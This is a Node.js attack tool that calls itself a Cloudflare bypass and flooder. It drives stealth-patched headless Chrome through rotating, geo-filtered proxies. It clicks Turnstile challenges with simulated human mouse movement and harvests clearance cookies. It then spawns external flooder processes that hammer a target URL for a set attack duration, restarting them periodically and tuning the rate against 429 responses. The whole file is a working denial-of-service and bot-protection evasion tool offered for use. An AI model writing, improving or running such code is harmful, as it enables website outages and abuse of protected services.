const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const colors = require('colors');
const fs = require('fs');
const path = require('path');
const argv = require('minimist')(process.argv.slice(2));
const timers = require('timers/promises');
const { spawn } = require('child_process');
const os = require('os');
const axios = require('axios');

// Optional: GeoIP support
let MMDBReader;
let geoReader;
try {
    MMDBReader = require('mmdb-reader');
    if (fs.existsSync('GeoLite2-Country.mmdb')) {
        geoReader = new MMDBReader('GeoLite2-Country.mmdb');
    }
} catch (e) {
    // GeoIP optional, continue without it
}

puppeteer.use(StealthPlugin());

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// Suppress errors unless debug mode
if (!argv['debug']) {
    process.on("uncaughtException", () => { });
    process.on("unhandledRejection", () => { });
}

// ============================================================================
// CONFIGURATION & CONSTANTS
// ============================================================================

const REQUIRED_FILES = ['proxy.txt']; // Basic required file
const OPTIONAL_FILES = {
    'flooder': './fld',
    'extension': './extension',
    'geoip': 'GeoLite2-Country.mmdb'
};

const BAN_TITLES = [
    'Access denied',
    'Attention Required! | Cloudflare',
    '403 Forbidden',
    'security check',
    'One more step',
    'Sucuri WebSite Firewall'
];

const PROTECTION_KEYWORDS = [
    'just a moment...',
    'ddos-guard',
    '403 forbidden',
    'security check',
    'one more step',
    'sucuri website firewall'
];

// ============================================================================
// COMMAND LINE ARGS
// ============================================================================

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const sessions = parseInt(process.argv[4]);
const proxyFile = process.argv[5];

const debugMode = argv['debug'] || false;
const headlessMode = argv['headless'] || false;
const flooderEnabled = argv['flooder'] || false;
const proxyAuth = argv['auth'] || false;
const verifyProxies = argv['verify'] || false;
const desiredCookies = parseInt(argv['cookies']) || 1;
const rateLimit = argv['rate'] || 64;
const geoFilter = argv['geo'] || null;
const floodThreads = parseInt(argv['threads']) || 1;
const randMethod = argv['randmethod'] || false;
const randPath = argv['randpath'] || false;
const randRate = argv['randrate'] || false;
const delayFlood = argv['delay'] || false;
const bypassMode = argv['bypass'] || false;

// ============================================================================
// USAGE & VALIDATION
// ============================================================================

if (process.argv.length < 6) {
    const fileName = path.basename(__filename);
    console.log(`
  ${colors.white.bold('UNIFIED BROWSER')} - Advanced Cloudflare Bypass & Flooder
  ${colors.green.bold('Version')}: 2.0 (JsBrowser + CHOMIK merged)

  ${colors.magenta.bold('USAGE')}:
      node ${fileName} <target> <time> <sessions> <proxyfile> [options]

  ${colors.magenta.bold('REQUIRED PARAMETERS')}:
      TARGET           Target URL (e.g., https://example.com)
      TIME             Attack duration in seconds
      SESSIONS         Number of browser sessions (threads)
      PROXYFILE        Path to proxy list file

  ${colors.magenta.bold('BROWSER OPTIONS')}:
      --headless       Run browser in headless mode (default: false)
      --auth           Proxy auth format: user:pass:ip:port (default: false)
      --verify         Verify proxies before use (default: false)
      --debug          Show detailed logs and errors (default: false)
      --cookies        Number of cookies to collect (default: 1)
      --geo            Filter proxies by country code (e.g., US, GB)

  ${colors.magenta.bold('FLOODER OPTIONS')}:
      --flooder        Enable flooding after bypass (default: false)
      --threads        Flooder threads per session (default: 1)
      --rate           Request rate limit (number or 'auto') (default: 64)
      --bypass         Use bypass mode flooding (default: false)
      --randmethod     Random HTTP methods (default: false)
      --randpath       Random query strings (default: false)
      --randrate       Random rate limiting (default: false)
      --delay          Add delay between requests (default: false)

  ${colors.magenta.bold('PROXY FORMAT')}:
      IP:PORT                      (Without auth)
      USER:PASS:IP:PORT            (With auth, use --auth flag)

  ${colors.magenta.bold('EXAMPLES')}:
      node ${fileName} https://target.com 120 10 proxy.txt --debug
      node ${fileName} https://target.com 300 5 proxy.txt --flooder --rate auto
      node ${fileName} https://target.com 120 8 proxy.txt --geo US --verify
      xvfb-run node ${fileName} https://target.com 120 10 proxy.txt --flooder
`);
    process.exit(0);
}

// ============================================================================
// DEPENDENCY VALIDATION
// ============================================================================

function validateDependencies() {
    const missing = [];

    // Check required files
    for (const file of REQUIRED_FILES) {
        if (!fs.existsSync(file) && file !== 'proxy.txt') {
            missing.push(file);
        }
    }

    // Check proxy file specifically
    if (!fs.existsSync(proxyFile)) {
        log('error', `Proxy file not found: ${proxyFile}`);
        process.exit(1);
    }

    // Check optional files based on features
    if (flooderEnabled && !fs.existsSync('flood.js')) {
        log('warn', `Flooder found at flood.js`);
    }

    if (geoFilter && !geoReader) {
        log('warn', 'GeoIP database not found, geo-filtering disabled');
    }

    if (missing.length > 0) {
        log('error', `Missing required files: ${missing.join(', ')}`);
        process.exit(1);
    }

    return true;
}

// ============================================================================
// CHROME PATH DETECTION
// ============================================================================

function findChrome() {
    const chromePaths = [
        // Linux paths
        '/usr/bin/google-chrome',
        '/usr/bin/google-chrome-stable',
        '/usr/bin/chromium-browser',
        '/usr/bin/chromium',
        '/snap/bin/chromium',
        // Windows paths
        'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
        'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
        process.env.LOCALAPPDATA + '\\Google\\Chrome\\Application\\chrome.exe',
        // macOS paths
        '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
        '/Applications/Chromium.app/Contents/MacOS/Chromium'
    ];

    for (const chromePath of chromePaths) {
        if (fs.existsSync(chromePath)) {
            log('info', `Found Chrome at: ${chromePath}`);
            return chromePath;
        }
    }

    // Let puppeteer find it
    log('warn', 'Chrome path not found, using puppeteer auto-detection');
    return undefined;
}

// ============================================================================
// LOGGING
// ============================================================================

function log(type, message) {
    if (!debugMode && type === 'debug') return;

    const d = new Date();
    const hours = String(d.getHours()).padStart(2, '0');
    const minutes = String(d.getMinutes()).padStart(2, '0');
    const seconds = String(d.getSeconds()).padStart(2, '0');
    const timestamp = `${hours}:${minutes}:${seconds}`.cyan;

    const parsed = new URL(target);
    const hostname = parsed.hostname.gray;

    let prefix;
    switch (type) {
        case 'browser':
            prefix = 'BROWSER'.brightGreen;
            break;
        case 'flooder':
            prefix = 'FLOODER'.brightYellow;
            break;
        case 'rate':
            prefix = 'RATE'.brightMagenta;
            break;
        case 'error':
            prefix = 'ERROR'.brightRed;
            break;
        case 'warn':
            prefix = 'WARN'.yellow;
            break;
        case 'info':
            prefix = 'INFO'.brightBlue;
            break;
        default:
            prefix = 'STATUS'.white;
    }

    console.log(`[${timestamp}] [${prefix}] [${hostname}] ${message}`);
}

// ============================================================================
// PROXY MANAGEMENT
// ============================================================================

let proxies = [];
let liveProxies = [];
let usedProxies = {};
let blockedProxies = new Set();
let proxyStats = {};

// Load proxies from file
function loadProxies() {
    try {
        const raw = fs.readFileSync(proxyFile, 'utf-8')
            .toString()
            .replace(/\r/g, '')
            .split('\n')
            .filter(line => line.trim().length > 0);

        proxies = shuffleArray(raw);
        log('info', `Loaded ${proxies.length} proxies from ${proxyFile}`);
    } catch (e) {
        log('error', `Failed to load proxy file: ${e.message}`);
        process.exit(1);
    }
}

// Shuffle array
function shuffleArray(array) {
    const arr = [...array];
    for (let i = arr.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    return arr;
}

// Update proxy statistics
function updateProxyStats(proxy, success, solveTime) {
    if (!proxyStats[proxy]) {
        proxyStats[proxy] = {
            successes: 0,
            failures: 0,
            totalTime: 0,
            avgTime: 0
        };
    }

    if (success) {
        proxyStats[proxy].successes++;
        proxyStats[proxy].totalTime += solveTime;
        proxyStats[proxy].avgTime = proxyStats[proxy].totalTime / proxyStats[proxy].successes;
    } else {
        proxyStats[proxy].failures++;
    }
}

// Get proxy quality rating
function getProxyQuality(proxy) {
    if (!proxyStats[proxy]) return 'unknown';

    const stats = proxyStats[proxy];
    const total = stats.successes + stats.failures;

    if (total === 0) return 'unknown';

    const successRate = stats.successes / total;

    if (successRate > 0.7 && stats.avgTime < 15000) return 'good';
    if (successRate > 0.5) return 'medium';
    return 'poor';
}

// Verify proxy connectivity
async function verifyProxy(proxy) {
    const parsed = parseProxy(proxy);
    if (!parsed || !parsed.host || !parsed.port) return false;

    const proxyConfig = {
        host: parsed.host,
        port: parsed.port
    };

    if (parsed.username && parsed.password) {
        proxyConfig.auth = { username: parsed.username, password: parsed.password };
    }

    try {
        const response = await axios.get('https://www.google.com', {
            proxy: proxyConfig,
            timeout: 5000
        });

        if (response.status === 200) {
            if (debugMode) log('debug', `Proxy ${proxyHost}:${proxyPort} is live`);
            return true;
        }
        return false;
    } catch (err) {
        if (debugMode) log('debug', `Proxy ${proxyHost}:${proxyPort} failed: ${err.message}`);
        return false;
    }
}

// Collect live proxies
async function collectLiveProxies() {
    if (!verifyProxies) {
        liveProxies = proxies.slice();
        return;
    }

    log('info', 'Verifying proxies...');
    liveProxies = [];

    for (const proxy of proxies) {
        if (liveProxies.length >= sessions) break;

        const isLive = await verifyProxy(proxy);
        if (isLive) {
            liveProxies.push(proxy);
        }
    }

    if (liveProxies.length < sessions) {
        log('warn', `Only found ${liveProxies.length} live proxies (need ${sessions}), using all available`);
        if (liveProxies.length === 0) {
            log('error', 'No live proxies found!');
            process.exit(1);
        }
    } else {
        log('info', `Verified ${liveProxies.length} live proxies`);
    }
}

// Apply geo-filtering
function applyGeoFilter() {
    if (!geoFilter || !geoReader) return;

    log('info', `Applying geo-filter: ${geoFilter}`);
    const filtered = [];

    for (const proxy of proxies) {
        const parsed = parseProxy(proxy);
        let ip = parsed ? parsed.host : null;
        if (!ip) continue;

        try {
            const result = geoReader.lookup(ip);
            if (result && result.country && result.country.iso_code) {
                if (result.country.iso_code.toLowerCase() === geoFilter.toLowerCase()) {
                    filtered.push(proxy);
                }
            }
        } catch (e) {
            // Skip proxies that can't be geolocated
        }
    }

    if (filtered.length === 0) {
        log('warn', `No proxies found for country ${geoFilter}, using all proxies`);
    } else {
        proxies = filtered;
        log('info', `Filtered to ${proxies.length} proxies for ${geoFilter}`);
    }
}

// Get random proxy
function getRandomProxy() {
    const pool = verifyProxies ? liveProxies : proxies;
    let proxy = pool[Math.floor(Math.random() * pool.length)];

    // Avoid recently used or blocked proxies
    let attempts = 0;
    while ((usedProxies[proxy] || blockedProxies.has(proxy)) && attempts < pool.length) {
        proxy = pool[Math.floor(Math.random() * pool.length)];
        attempts++;
    }

    // If all proxies used, reset
    if (attempts >= pool.length) {
        usedProxies = {};
    }

    usedProxies[proxy] = true;
    return proxy;
}

// Parse proxy into components
function parseProxy(proxy) {
    const parts = proxy.split(':');

    // Handle IP:PORT
    if (parts.length === 2) {
        return {
            host: parts[0],
            port: parseInt(parts[1]),
            username: undefined,
            password: undefined
        };
    }

    // Handle Auth formats
    if (parts.length === 4) {
        // Try to detect format:
        // 1. host:port:user:pass (Common format) - Port is at index 1
        // 2. user:pass:host:port (Legacy format) - Port is at index 3

        const p1 = parseInt(parts[1]); // Potential port in format 1
        const p3 = parseInt(parts[3]); // Potential port in format 2

        const isPort = (n) => !isNaN(n) && n > 0 && n <= 65535;

        // If part 1 looks like a port and part 3 doesn't (or we want to prioritize this format)
        if (isPort(p1) && !String(parts[1]).includes('.')) {
            return {
                host: parts[0],
                port: p1,
                username: parts[2],
                password: parts[3]
            };
        }

        // Default to user:pass:host:port
        return {
            host: parts[2],
            port: p3,
            username: parts[0],
            password: parts[1]
        };
    }

    // Fallback
    return { host: parts[0], port: parseInt(parts[1]) };
}

// Periodic cleanup of usedProxies
setInterval(() => {
    if (Object.keys(usedProxies).length > proxies.length * 2) {
        log('debug', 'Cleaning up used proxies cache');
        usedProxies = {};
    }
}, 60000);

// ============================================================================
// COOKIE MANAGEMENT
// ============================================================================

let cookieCount = 0;

function getCookieCount() {
    if (!fs.existsSync('cookie_count.txt')) return 0;
    return parseInt(fs.readFileSync('cookie_count.txt', 'utf-8') || '0');
}

function incrementCookieCount() {
    cookieCount = getCookieCount() + 1;
    fs.writeFileSync('cookie_count.txt', cookieCount.toString());
    return cookieCount;
}

// Validate cookie quality
function validateCookie(cookieString) {
    if (!cookieString || cookieString.length === 0) return false;

    // Check for Cloudflare cookies
    const hasCfClearance = cookieString.includes('cf_clearance=');
    const hasCfBm = cookieString.includes('__cf_bm=');

    if (!hasCfClearance && !hasCfBm) {
        return false;
    }

    // Validate cookie value length
    const cfMatch = cookieString.match(/cf_clearance=([^;]+)/);
    const bmMatch = cookieString.match(/__cf_bm=([^;]+)/);

    const cfValue = cfMatch ? cfMatch[1] : '';
    const bmValue = bmMatch ? bmMatch[1] : '';

    // Cookie value should be substantial
    if (cfValue.length < 10 && bmValue.length < 10) {
        return false;
    }

    return true;
}

// ============================================================================
// BROWSER AUTOMATION
// ============================================================================

// Check if challenge is solved
async function isChallengeSolved(page, protections) {
    try {
        // Quick cookie check first
        const cookiesCheck = await page.evaluate(() => {
            const cfClearance = document.cookie.split(';').find(row => row.trim().startsWith('cf_clearance='));
            const cfBM = document.cookie.split(';').find(row => row.trim().startsWith('__cf_bm='));
            return (cfClearance && cfClearance.split('=')[1]?.length > 10) ||
                (cfBM && cfBM.split('=')[1]?.length > 10);
        });

        if (cookiesCheck) {
            const quickCheck = await page.evaluate(() => {
                return document.readyState === 'complete' &&
                    !document.body.innerHTML.includes('Just a moment');
            });

            if (quickCheck) return true;
        }

        // Title check
        const title = await page.title();
        if (title && protections.some(p => title.toLowerCase().includes(p))) {
            return false;
        }

        // Full verification
        const isSolved = await page.evaluate(() => {
            return document.readyState === 'complete' &&
                !document.body.innerHTML.includes('Just a moment') &&
                !document.body.querySelector('.cf-browser-verification') &&
                !document.body.querySelector('[data-ray]') &&
                document.body.children.length > 0;
        });

        return isSolved;
    } catch (err) {
        return false;
    }
}

// Simulate human-like mouse movement (Bezier curve)
async function humanMove(page, startX, startY, endX, endY) {
    const steps = 25; // Number of steps for the movement
    const controlX = (startX + endX) / 2 + (Math.random() * 100 - 50); // Random control point
    const controlY = (startY + endY) / 2 + (Math.random() * 100 - 50); // Random control point

    for (let i = 1; i <= steps; i++) {
        const t = i / steps;
        // Bezier curve formula
        const x = (1 - t) * (1 - t) * startX + 2 * (1 - t) * t * controlX + t * t * endX;
        const y = (1 - t) * (1 - t) * startY + 2 * (1 - t) * t * controlY + t * t * endY;

        await page.mouse.move(x, y);
        // Random usage variation delay
        await timers.setTimeout(Math.floor(Math.random() * 15) + 5);
    }
}

// Solve Turnstile challenge
async function solveTurnstile(page) {
    try {
        const elements = await page.$$('[name="cf-turnstile-response"]');

        if (elements.length <= 0) return false;

        for (const element of elements) {
            try {
                const parentElement = await element.evaluateHandle(el => el.parentElement);
                const box = await parentElement.boundingBox();

                if (!box) continue;

                const targetX = box.x + 30; // Checkbox area
                const targetY = box.y + box.height / 2;

                // Get current mouse position (approximate or start from random)
                const startX = Math.random() * 1920;
                const startY = Math.random() * 1080;

                // Move mouse realistically to the checkbox
                await humanMove(page, startX, startY, targetX, targetY);

                // Small hesitation before click
                await timers.setTimeout(Math.floor(Math.random() * 200) + 100);

                // Click
                await page.mouse.down();
                await timers.setTimeout(Math.floor(Math.random() * 100) + 50);
                await page.mouse.up();

                log('browser', 'Clicked Turnstile challenge (Humanized)');

                // Wait to see if it worked
                await timers.setTimeout(2000);

            } catch (err) {
                log('debug', `Turnstile click error: ${err.message}`);
            }
        }

        return true;
    } catch (err) {
        return false;
    }
}

// Main browser runner
async function runBrowser(proxy) {
    const startTime = Date.now();
    let browser, page;

    try {
        // Check if we've collected enough cookies
        if (getCookieCount() >= desiredCookies) {
            await timers.setTimeout(1000);
            return;
        }

        const proxyConfig = parseProxy(proxy);
        const chromePath = findChrome();

        log('browser', `Starting browser with proxy ${proxyConfig.host}:${proxyConfig.port}`);

        // Browser launch args
        const args = [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--no-first-run',
            '--no-zygote',
            '--disable-gpu',
            '--disable-blink-features=AutomationControlled',
            '--disable-extensions',
            '--disable-background-networking',
            '--disable-default-apps',
            '--disable-sync',
            '--metrics-recording-only',
            '--mute-audio',
            '--no-default-browser-check',
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-renderer-backgrounding',
            '--window-size=1920,1080',
            `--proxy-server=${proxyConfig.host}:${proxyConfig.port}`
        ];

        // Add extension if available
        if (fs.existsSync('./extension')) {
            args.push(`--disable-extensions-except=${path.join(__dirname, 'extension')}`);
            args.push(`--load-extension=${path.join(__dirname, 'extension')}`);
        }

        const launchOptions = {
            headless: headlessMode,
            args: args,
            defaultViewport: { width: 1920, height: 1080 },
            ignoreHTTPSErrors: true
        };

        if (chromePath) {
            launchOptions.executablePath = chromePath;
        }

        browser = await puppeteer.launch(launchOptions);
        const pages = await browser.pages();
        page = pages[0] || await browser.newPage();

        // Set proxy authentication if needed
        if (proxyConfig.username && proxyConfig.password) {
            await page.authenticate({
                username: proxyConfig.username,
                password: proxyConfig.password
            });
        }

        // Enhanced evasion
        await page.evaluateOnNewDocument(() => {
            // Override navigator properties
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });

            // Fix MouseEvent
            Object.defineProperty(MouseEvent.prototype, 'screenX', {
                get: function () { return this.clientX + window.screenX; }
            });
            Object.defineProperty(MouseEvent.prototype, 'screenY', {
                get: function () { return this.clientY + window.screenY; }
            });

            // Chrome runtime
            window.chrome = { runtime: {} };
        });

        // Adaptive timeout based on proxy quality
        const proxyQuality = getProxyQuality(proxy);
        const gotoTimeout = proxyQuality === 'good' ? 20000 :
            proxyQuality === 'medium' ? 25000 : 30000;

        // Navigate to target
        await page.goto(target, {
            waitUntil: 'domcontentloaded',
            timeout: gotoTimeout
        });

        log('browser', `Navigated to ${target}`);

        // Check for ban/block
        const initialTitle = await page.title();
        for (const banTitle of BAN_TITLES) {
            if (initialTitle.toLowerCase().includes(banTitle.toLowerCase()) &&
                initialTitle === 'Attention Required! | Cloudflare') {
                log('warn', `Proxy ${proxy} is blocked by Cloudflare`);
                blockedProxies.add(proxy);
                updateProxyStats(proxy, false, Date.now() - startTime);

                await page.close().catch(() => { });
                await browser.close().catch(() => { });
                delete usedProxies[proxy];
                return;
            }
        }

        // Handle Turnstile if present
        if (initialTitle === 'Just a moment...') {
            log('browser', 'Detected Cloudflare Turnstile challenge');

            await timers.setTimeout(4000);

            let attempts = 0;
            const maxAttempts = 10;

            while (await page.title() === 'Just a moment...' && attempts < maxAttempts) {
                await solveTurnstile(page);
                await timers.setTimeout(1500);
                attempts++;
            }

            if (await page.title() === 'Just a moment...') {
                log('warn', 'Failed to solve Turnstile challenge');
                updateProxyStats(proxy, false, Date.now() - startTime);

                await page.close().catch(() => { });
                await browser.close().catch(() => { });
                delete usedProxies[proxy];
                return;
            }

            log('browser', 'Turnstile challenge solved');
        }

        // Wait for challenge to be fully solved
        const maxWaitTime = proxyQuality === 'good' ? 30000 :
            proxyQuality === 'medium' ? 35000 : 40000;
        const pollInterval = 150;

        const startPoll = Date.now();
        let solved = false;

        while (Date.now() - startPoll < maxWaitTime) {
            solved = await isChallengeSolved(page, PROTECTION_KEYWORDS);
            if (solved) break;

            try {
                const currentTitle = await page.title();
                if (currentTitle.startsWith('Failed to load URL')) {
                    throw new Error('Failed to load URL');
                }
            } catch (e) {
                // Ignore navigation errors during check
            }

            await timers.setTimeout(pollInterval);
        }

        if (!solved) {
            log('warn', 'Challenge not solved within timeout');
            updateProxyStats(proxy, false, Date.now() - startTime);

            await page.close().catch(() => { });
            await browser.close().catch(() => { });
            delete usedProxies[proxy];
            return;
        }

        // Wait for cookies to settle (Important for capture)
        await timers.setTimeout(Math.floor(Math.random() * 2000) + 3000);

        // Extract cookies and metadata
        const cookies = await page.cookies();
        const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
        const userAgent = await page.evaluate(() => navigator.userAgent);
        const pageTitle = await page.title();

        // Validate cookies
        if (!validateCookie(cookieString)) {
            log('warn', 'Invalid or empty cookies received');
            updateProxyStats(proxy, false, Date.now() - startTime);

            await page.close().catch(() => { });
            await browser.close().catch(() => { });
            delete usedProxies[proxy];
            return;
        }

        // Save cookies
        fs.appendFileSync('cookies.txt', `${proxy} | ${userAgent} | ${cookieString}\n`);

        const endTime = Date.now();
        const solveTime = Math.floor((endTime - startTime) / 1000);
        updateProxyStats(proxy, true, endTime - startTime);

        const totalCookies = incrementCookieCount();

        // Log success
        console.log(`{`);
        console.log(`   ${'pageTitle'.bgWhite.black}: ${pageTitle.green}`);
        console.log(`   ${'proxyAddress'.bgWhite.black}: ${proxy.green}`);
        console.log(`   ${'userAgent'.bgWhite.black}: ${userAgent.green}`);
        console.log(`   ${'cookieFound'.bgWhite.black}: ${cookieString.substring(0, 80).green}...`);
        console.log(`   ${'solveTime'.bgWhite.black}: ${`${solveTime}s`.green}`);
        console.log(`   ${'totalCookies'.bgWhite.black}: ${totalCookies.toString().green}`);
        console.log(`}`);

        await page.close().catch(() => { });
        await browser.close().catch(() => { });

        // Start flooder if enabled
        if (flooderEnabled) {
            startFlooder(proxy, userAgent, cookieString);
        }

        delete usedProxies[proxy];

    } catch (err) {
        log('debug', `Browser error: ${err.message}`);
        updateProxyStats(proxy, false, Date.now() - startTime);

        if (page) await page.close().catch(() => { });
        if (browser) await browser.close().catch(() => { });

        delete usedProxies[proxy];
        await timers.setTimeout(1000);
    }
}

// ============================================================================
// FLOODER MANAGEMENT
// ============================================================================

const activeFlooders = new Map();

function startFlooder(proxy, userAgent, cookieString) {
    const proxyConfig = parseProxy(proxy);
    const proxyString = proxyConfig.username && proxyConfig.password ?
        `${proxyConfig.username}:${proxyConfig.password}@${proxyConfig.host}:${proxyConfig.port}` :
        `${proxyConfig.host}:${proxyConfig.port}`;

    const args = [
        'flood.js',
        target,
        duration.toString(),
        floodThreads.toString(),
        proxyString, // Use formatted string with @ for auth
        rateLimit.toString(),
        cookieString, // Cookie (argv[7])
        userAgent // UA (argv[8])
    ];

    try {
        const flooder = spawn('node', args, { detached: false });

        log('flooder', `Started for proxy ${proxyConfig.host}:${proxyConfig.port}`);

        // Kill previous flooder for this proxy if exists
        if (activeFlooders.has(proxy)) {
            const oldFlooder = activeFlooders.get(proxy);
            oldFlooder.kill();
        }

        activeFlooders.set(proxy, flooder);

        // Auto-restart after 45s
        const restartTimer = setInterval(() => {
            if (activeFlooders.has(proxy)) {
                const oldFlooder = activeFlooders.get(proxy);
                oldFlooder.kill();
            }

            const newFlooder = spawn('node', args, { detached: false });
            activeFlooders.set(proxy, newFlooder);

            log('flooder', `Restarted for proxy ${proxyConfig.host}:${proxyConfig.port}`);
        }, 45000);

        flooder.on('exit', () => {
            clearInterval(restartTimer);
            activeFlooders.delete(proxy);
        });

        if (debugMode) {
            flooder.stdout.on('data', (data) => {
                log('flooder', data.toString().trim());
            });
        }

    } catch (err) {
        log('error', `Failed to start flooder: ${err.message}`);
    }
}

// Cleanup all flooders on exit
function cleanupFlooders() {
    for (const [proxy, flooder] of activeFlooders.entries()) {
        flooder.kill();
    }
    activeFlooders.clear();
}

// ============================================================================
// AUTO-RATE DETECTION
// ============================================================================

async function detectOptimalRate() {
    log('rate', 'Starting auto-rate detection...');

    let detectedRate = 64;
    let testBrowser;

    try {
        // Get a test proxy
        const testProxy = getRandomProxy();
        const proxyConfig = parseProxy(testProxy);

        log('rate', `Using test proxy: ${proxyConfig.host}:${proxyConfig.port}`);

        // Launch browser and solve challenge
        const chromePath = findChrome();
        const args = [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=1920,1080',
            `--proxy-server=${proxyConfig.host}:${proxyConfig.port}`
        ];

        testBrowser = await puppeteer.launch({
            headless: headlessMode,
            args: args,
            executablePath: chromePath,
            defaultViewport: { width: 1920, height: 1080 }
        });

        const pages = await testBrowser.pages();
        const page = pages[0] || await testBrowser.newPage();

        if (proxyConfig.username && proxyConfig.password) {
            await page.authenticate({
                username: proxyConfig.username,
                password: proxyConfig.password
            });
        }

        await page.goto(target, { waitUntil: 'domcontentloaded', timeout: 30000 });

        // Handle Turnstile
        if (await page.title() === 'Just a moment...') {
            log('rate', 'Solving Turnstile...');
            await timers.setTimeout(4000);

            let attempts = 0;
            while (await page.title() === 'Just a moment...' && attempts < 10) {
                await solveTurnstile(page);
                await timers.setTimeout(1500);
                attempts++;
            }
        }

        await timers.setTimeout(2000);

        const cookies = await page.cookies();
        const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
        const userAgent = await page.evaluate(() => navigator.userAgent);

        await testBrowser.close();

        log('rate', 'Challenge solved, starting flood test...');

        // Run test flood with 16 req/s
        const proxyString = proxyConfig.username && proxyConfig.password ?
            `${proxyConfig.username}:${proxyConfig.password}:${proxyConfig.host}:${proxyConfig.port}` :
            `${proxyConfig.host}:${proxyConfig.port}`;

        const testArgs = [
            '-u', target,
            '-d', '10',
            '-t', '2',
            '-r', '16',
            '-p', proxyString,
            '-cookie', cookieString,
            '-ua', userAgent
        ];

        const testFlooder = spawn('./fld', testArgs);

        let totalRequests = 0;
        let rateLimitedRequests = 0;

        testFlooder.stdout.on('data', (data) => {
            const lines = data.toString().trim().split('\n');
            for (const line of lines) {
                const statusCode = parseInt(line);
                if (!isNaN(statusCode)) {
                    totalRequests++;
                    if (statusCode === 429) {
                        rateLimitedRequests++;
                    }
                }
            }
        });

        // Wait for test to complete
        await new Promise((resolve) => {
            testFlooder.on('exit', resolve);
            setTimeout(resolve, 12000); // Safety timeout
        });

        testFlooder.kill();

        // Calculate rate
        const blockedPercentage = totalRequests > 0 ? (rateLimitedRequests / totalRequests) * 100 : 0;

        log('rate', `Test results: ${totalRequests} requests, ${rateLimitedRequests} rate-limited (${blockedPercentage.toFixed(2)}%)`);

        // Adjust rate based on results
        if (blockedPercentage >= 100) detectedRate = 1;
        else if (blockedPercentage > 95) detectedRate = 3;
        else if (blockedPercentage > 90) detectedRate = 5;
        else if (blockedPercentage > 85) detectedRate = 8;
        else if (blockedPercentage > 80) detectedRate = 10;
        else if (blockedPercentage > 75) detectedRate = 12;
        else if (blockedPercentage > 70) detectedRate = 17;
        else if (blockedPercentage > 65) detectedRate = 22;
        else if (blockedPercentage > 60) detectedRate = 27;
        else if (blockedPercentage > 55) detectedRate = 30;
        else if (blockedPercentage > 50) detectedRate = 35;
        else if (blockedPercentage > 40) detectedRate = 40;
        else if (blockedPercentage > 30) detectedRate = 45;
        else if (blockedPercentage > 20) detectedRate = 50;
        else if (blockedPercentage > 10) detectedRate = 55;
        else if (blockedPercentage > 5) detectedRate = 64;
        else detectedRate = 64;

        log('rate', `Optimal rate detected: ${detectedRate} req/s`);

        delete usedProxies[testProxy];
        return detectedRate;

    } catch (err) {
        log('warn', `Auto-rate detection failed: ${err.message}, using default rate`);
        if (testBrowser) await testBrowser.close().catch(() => { });
        return 64;
    }
}

// ============================================================================
// MAIN EXECUTION
// ============================================================================

async function main() {
    console.clear();
    console.log(`
${'='.repeat(70).brightGreen}
  ${colors.white.bold('UNIFIED BROWSER v2.0')} - Cloudflare Bypass System
  Target: ${target.brightCyan}
  Duration: ${duration.toString().brightYellow}s
  Sessions: ${sessions.toString().brightMagenta}
  Flooder: ${flooderEnabled ? 'ENABLED'.green : 'DISABLED'.red}
${'='.repeat(70).brightGreen}
`);

    // Validate dependencies
    validateDependencies();

    // Load and prepare proxies
    loadProxies();
    applyGeoFilter();
    await collectLiveProxies();

    // Auto-rate detection if enabled
    let finalRate = rateLimit;
    if (rateLimit === 'auto' && flooderEnabled) {
        finalRate = await detectOptimalRate();
    }

    log('info', `Starting ${sessions} browser sessions...`);

    // Initialize cookie counter
    fs.writeFileSync('cookie_count.txt', '0');

    // Start browser sessions
    const browserLoops = [];
    for (let i = 0; i < sessions; i++) {
        browserLoops.push(browserLoop());
    }

    // Set timeout
    setTimeout(() => {
        log('info', 'Duration reached, shutting down...');
        cleanupFlooders();

        if (fs.existsSync('cookie_count.txt')) {
            fs.unlinkSync('cookie_count.txt');
        }

        process.exit(0);
    }, duration * 1000);

    // Wait for all sessions
    await Promise.all(browserLoops);
}

async function browserLoop() {
    while (true) {
        try {
            if (getCookieCount() >= desiredCookies) {
                await timers.setTimeout(5000);
                continue;
            }

            const proxy = getRandomProxy();
            await runBrowser(proxy);

            // Small delay between attempts
            await timers.setTimeout(2000);
        } catch (err) {
            log('debug', `Browser loop error: ${err.message}`);
            await timers.setTimeout(5000);
        }
    }
}

// Handle graceful shutdown
process.on('SIGTERM', () => {
    log('info', 'Received SIGTERM, shutting down...');
    cleanupFlooders();
    process.exit(0);
});

process.on('SIGINT', () => {
    log('info', 'Received SIGINT, shutting down...');
    cleanupFlooders();
    process.exit(0);
});

// Start the script
main().catch(err => {
    log('error', `Fatal error: ${err.message}`);
    cleanupFlooders();
    process.exit(1);
});
